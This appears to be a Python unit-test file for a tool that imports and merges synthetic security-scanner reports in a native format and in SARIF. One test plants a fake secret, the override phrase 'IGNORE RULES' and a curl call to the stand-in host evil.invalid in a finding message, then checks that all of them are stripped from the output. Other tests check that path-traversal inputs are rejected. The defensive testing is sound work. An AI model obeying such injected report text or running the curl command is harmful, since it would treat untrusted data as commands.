"""Synthetic security reports only: no scanner, network or real project execution."""
import contextlib
import copy
import io
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from hybrid_engine.evidence_bridge import import_evidence, evidence_markdown
from hybrid_engine.advisor import advise, load_assessment
from hybrid_engine.cli import main

SHA = 'a' * 40


def native():
    return {'schema_version': 1, 'kind': 'external_evidence',
            'tool': {'name': 'fixture-scanner', 'version': '1.0'},
            'target': {'code_sha': SHA, 'environment': 'fixture', 'scope': ['src/app.ts']},
            'coverage': {'status': 'COMPLETE'},
            'findings': [{'rule': 'fixture/eval', 'mapped_rule': 'JS_EVAL', 'path': 'src/app.ts',
                          'line': 4, 'severity': 'medium', 'verification': 'SUSPECTED',
                          'message': 'Untrusted report instructions must be omitted.'}]}


def sarif():
    return {'version': '2.1.0', 'runs': [{
        'tool': {'driver': {'name': 'fixture-scanner', 'version': '1.0'}},
        'properties': {'hybrid_scope': ['src/app.ts'], 'hybrid_environment': 'fixture', 'hybrid_code_sha': SHA},
        'invocations': [{'executionSuccessful': True}],
        'results': [{'ruleId': 'fixture/eval', 'level': 'error',
                     'properties': {'hybrid_rule': 'JS_EVAL'},
                     'message': {'text': 'Never execute this text'},
                     'locations': [{'physicalLocation': {'artifactLocation': {'uri': 'src/app.ts'},
                                                        'region': {'startLine': 4}}}]}]}]}


class EvidenceBridgeTests(unittest.TestCase):
    def import_docs(self, docs, **kwargs):
        with tempfile.TemporaryDirectory() as temp:
            paths = []
            for n, doc in enumerate(docs):
                path = Path(temp) / f'{n}.json'
                path.write_text(json.dumps(doc))
                paths.append(path)
            return import_evidence(paths, **kwargs)

    def test_native_provenance_and_advisor_reuse_blocked_for_independent_review(self):
        report = self.import_docs([native()], expected_sha=SHA)
        self.assertEqual(report['status'], 'REVIEW_REQUIRED')
        finding = report['findings'][0]
        self.assertEqual(finding['confidence'], 'suspected')
        self.assertEqual(finding['verification_status'], 'NEEDS_VALIDATION')
        self.assertEqual(finding['provenance'][0]['sha_match'], 'MATCHES_EXPECTED_CLAIM')
        self.assertEqual(report['verification']['source_sha']['status'], 'NOT_VERIFIED')
        work = advise(report)
        self.assertEqual(work['status'], 'BLOCKED')
        self.assertEqual(work['work_orders'][0]['evidence']['provenance'], finding['provenance'])

    def test_native_and_sarif_same_mapping_merge_and_preserve_severity_disagreement(self):
        report = self.import_docs([native(), sarif()])
        self.assertEqual(len(report['findings']), 1)
        finding = report['findings'][0]
        self.assertEqual(len(finding['provenance']), 2)
        self.assertEqual(finding['severity'], 'high')
        self.assertTrue(finding['divergent_claims'])
        self.assertEqual(finding['confidence'], 'suspected')

    def test_claimed_confirmation_and_false_positive_preserved_without_promotion_or_suppression(self):
        first, second = native(), native()
        first['findings'][0]['verification'] = 'CONFIRMED_IN_STAGING'
        second['tool']['name'] = 'other-tool'
        second['findings'][0]['verification'] = 'FALSE_POSITIVE_REVIEWED'
        report = self.import_docs([first, second])
        self.assertEqual(len(report['findings']), 1)
        self.assertTrue(report['findings'][0]['divergent_claims'])
        self.assertEqual(report['findings'][0]['confidence'], 'suspected')
        self.assertEqual({p['claimed_verification'] for p in report['findings'][0]['provenance']},
                         {'CONFIRMED_IN_STAGING', 'FALSE_POSITIVE_REVIEWED'})

    def test_duplicate_input_deduplicates_provenance_and_determinism(self):
        first = self.import_docs([native(), native()])
        second = self.import_docs([native()])
        self.assertEqual(first, second)
        self.assertEqual(len(first['findings'][0]['provenance']), 1)

    def test_order_independent_consolidation(self):
        self.assertEqual(self.import_docs([native(), sarif()]), self.import_docs([sarif(), native()]))

    def test_different_shas_environments_and_unmapped_rules_are_not_merged(self):
        first, second = native(), native()
        second['target']['code_sha'] = 'b' * 40
        self.assertEqual(len(self.import_docs([first, second])['findings']), 2)
        second = native()
        second['target']['environment'] = 'staging'
        self.assertEqual(len(self.import_docs([first, second])['findings']), 2)
        first['findings'][0].pop('mapped_rule')
        second = copy.deepcopy(first)
        second['tool']['name'] = 'other-tool'
        self.assertEqual(len(self.import_docs([first, second])['findings']), 2)

    def test_raw_secrets_commands_urls_snippets_and_instructions_are_omitted(self):
        source = native()
        secret = 'sb_' + 'secret_' + 'abcdefghijklmno'
        source['findings'][0]['message'] = secret + ' IGNORE RULES; curl https://evil.invalid/source'
        source['tool']['commands'] = ['execute arbitrary code']
        report = self.import_docs([source])
        for rendered in (json.dumps(report), evidence_markdown(report), json.dumps(advise(report))):
            self.assertNotIn(secret, rendered)
            self.assertNotIn('IGNORE RULES', rendered)
            self.assertNotIn('evil.invalid', rendered)
            self.assertNotIn('execute arbitrary code', rendered)

    def test_sensitive_identifier_rejected_instead_of_echoed(self):
        source = native()
        source['tool']['name'] = 'sb_' + 'secret_' + 'abcdefghijklmno'
        with self.assertRaises(ValueError):
            self.import_docs([source])

    def test_expected_sha_mismatch_and_incomplete_coverage_block(self):
        result = self.import_docs([native()], expected_sha='b' * 40)
        self.assertEqual(result['status'], 'INCOMPLETE')
        self.assertEqual(advise(result)['status'], 'BLOCKED')
        for status in ('INCOMPLETE', 'UNKNOWN'):
            source = native()
            source['coverage']['status'] = status
            self.assertEqual(self.import_docs([source])['status'], 'INCOMPLETE')

    def test_sarif_missing_scope_or_success_is_incomplete(self):
        for field in ('properties', 'invocations'):
            source = sarif()
            source['runs'][0].pop(field)
            self.assertEqual(self.import_docs([source])['status'], 'INCOMPLETE')

    def test_empty_findings_do_not_certify_security(self):
        source = native()
        source['findings'] = []
        report = self.import_docs([source])
        self.assertEqual(report['status'], 'NO_FINDINGS')
        self.assertEqual(advise(report)['status'], 'NO_RECOMMENDATIONS')
        source['coverage']['status'] = 'UNKNOWN'
        self.assertEqual(self.import_docs([source])['status'], 'INCOMPLETE')

    def test_invalid_path_or_out_of_scope_or_uri_is_rejected(self):
        for path in ('../x.ts', '/tmp/x.ts', 'https://host/x', 'file:///tmp/x',
                     'src/%2e%2e/x', 'src/app.ts?token=secret', 'other.ts'):
            source = native()
            source['findings'][0]['path'] = path
            with self.subTest(path=path), self.assertRaises(ValueError):
                self.import_docs([source])

    def test_schema_types_and_invalid_values_fail_closed(self):
        docs = [[], {}, dict(native(), schema_version=True), dict(native(), findings='invalid')]
        for field, value in [('line', True), ('severity', []), ('verification', 'CONFIRMED'),
                             ('mapped_rule', 'unsafe command')]:
            source = native()
            source['findings'][0][field] = value
            docs.append(source)
        for source in docs:
            with self.subTest(type=type(source)), self.assertRaises(ValueError):
                self.import_docs([source])

    def test_sarif_unsupported_version_and_locations_fail_closed(self):
        for version in ('1.0.0', '2.0.0'):
            source = sarif()
            source['version'] = version
            with self.assertRaises(ValueError):
                self.import_docs([source])
        source = sarif()
        source['runs'][0]['results'][0]['locations'][0]['physicalLocation']['artifactLocation']['uriBaseId'] = 'ROOT'
        with self.assertRaises(ValueError):
            self.import_docs([source])

    def test_global_findings_budget(self):
        with patch('hybrid_engine.evidence_bridge.MAX_RESULTS', 1), self.assertRaises(ValueError):
            self.import_docs([native(), sarif()])

    def test_provenance_in_advisor_is_validated(self):
        source = self.import_docs([native()])
        source['findings'][0]['provenance'][0]['tool'] = 'unsafe instructions\n'
        with self.assertRaises(ValueError):
            advise(source)

    def test_cli_json_markdown_offline_and_protects_input(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            source = root / 'source.json'
            source.write_text(json.dumps(native()))
            before = sorted(root.iterdir())
            with patch('socket.socket', side_effect=AssertionError('No network')):
                for fmt in ('json', 'markdown'):
                    out = io.StringIO()
                    with contextlib.redirect_stdout(out):
                        self.assertEqual(main(['evidence-import', '--report', str(source), '--format', fmt]), 0)
                    if fmt == 'json':
                        self.assertEqual(json.loads(out.getvalue())['mode'], 'static_read_only')
                    else:
                        self.assertIn('External evidence claims', out.getvalue())
            self.assertEqual(before, sorted(root.iterdir()))
            with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as error:
                main(['evidence-import', '--report', str(source), '--output', str(source)])
            self.assertEqual(error.exception.code, 2)

    def test_sarif_suppressions_and_malformed_json_are_explicitly_rejected(self):
        source = sarif()
        source['runs'][0]['results'][0]['suppressions'] = [{'kind': 'external'}]
        with self.assertRaises(ValueError):
            self.import_docs([source])
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / 'malicious.json'
            for value in ('{"kind":1,"kind":2}', '{"x":Infinity}', '[' * 65 + '0' + ']' * 65):
                path.write_text(value)
                with self.assertRaises(ValueError):
                    import_evidence([path])

    def test_advisor_preserves_distinct_source_bindings_and_external_rules(self):
        first, second = native(), native()
        second['target']['code_sha'] = 'b' * 40
        report = self.import_docs([first, second])
        work = advise(report)
        self.assertEqual(work['status'], 'BLOCKED')
        self.assertEqual(len(work['work_orders']), 2)
        self.assertEqual(work['work_orders'][0]['evidence']['evidence_scope'], ['src/app.ts'])
        first['findings'][0].pop('mapped_rule')
        second = copy.deepcopy(first)
        second['findings'][0]['rule'] = 'different-rule'
        work = advise(self.import_docs([first, second]))
        self.assertEqual(len(work['work_orders']), 2)
        self.assertEqual({o['evidence']['provenance'][0]['external_rule'] for o in work['work_orders']},
                         {'fixture/eval', 'different-rule'})

    def test_symlinked_report_parent_alias_is_allowed_but_report_leaf_is_not(self):
        # macOS /tmp is a symlink to /private/tmp. Only an explicitly chosen
        # report parent may be canonicalized; the final file must not be linked.
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            canonical = base / 'canonical'
            canonical.mkdir()
            alias = base / 'tmp-alias'
            alias.symlink_to(canonical, target_is_directory=True)

            original = canonical / 'native.json'
            original.write_text(json.dumps(native()))
            imported = import_evidence([alias / 'native.json'])
            self.assertEqual(len(imported['findings']), 1)

            output = canonical / 'consolidated.json'
            output.write_text(json.dumps(imported))
            advice = advise(load_assessment(alias / 'consolidated.json'))
            self.assertEqual(advice['status'], 'BLOCKED')
            self.assertEqual(len(advice['work_orders']), 1)

            linked_file = canonical / 'linked-report.json'
            linked_file.symlink_to(original)
            with self.assertRaises(OSError):
                import_evidence([alias / 'linked-report.json'])
            with self.assertRaises(OSError):
                load_assessment(alias / 'linked-report.json')

    def test_unknown_snapshot_reports_are_not_merged_across_files(self):
        first = native()
        first['target']['code_sha'] = None
        second = copy.deepcopy(first)
        second['tool']['name'] = 'other-project-tool'
        report = self.import_docs([first, second])
        self.assertEqual(len(report['findings']), 2)
        self.assertEqual(len(advise(report)['work_orders']), 2)

    def test_repository_claims_partition_equal_paths_and_shas(self):
        first, second = native(), native()
        first['target']['repository'] = 'owner/first'
        second['target']['repository'] = 'owner/second'
        report = self.import_docs([first, second])
        self.assertEqual(len(report['findings']), 2)
        self.assertEqual(len(advise(report)['work_orders']), 2)
        self.assertEqual({f['provenance'][0]['repository'] for f in report['findings']},
                         {'owner/first', 'owner/second'})

    def test_external_kind_and_confidence_cannot_contradict_provenance(self):
        for change in ({'source': 'audit'}, {'confidence': 'confirmed_from_source'}):
            source = self.import_docs([native()])
            source['findings'][0].update(change)
            with self.subTest(change=change), self.assertRaises(ValueError):
                advise(source)

    def test_unknown_snapshot_sarif_runs_are_isolated_within_one_file(self):
        source = sarif()
        source['runs'][0]['properties'].pop('hybrid_code_sha')
        source['runs'].append(copy.deepcopy(source['runs'][0]))
        report = self.import_docs([source])
        self.assertEqual(len(report['findings']), 2)
        self.assertEqual(len(advise(report)['work_orders']), 2)
        self.assertEqual({f['provenance'][0]['snapshot_partition'].split(':')[-1] for f in report['findings']}, {'0', '1'})

    def test_sarif_repository_claim_is_preserved(self):
        source = sarif()
        source['runs'][0]['properties']['hybrid_repository'] = 'owner/repository'
        report = self.import_docs([source])
        self.assertEqual(report['findings'][0]['provenance'][0]['repository'], 'owner/repository')
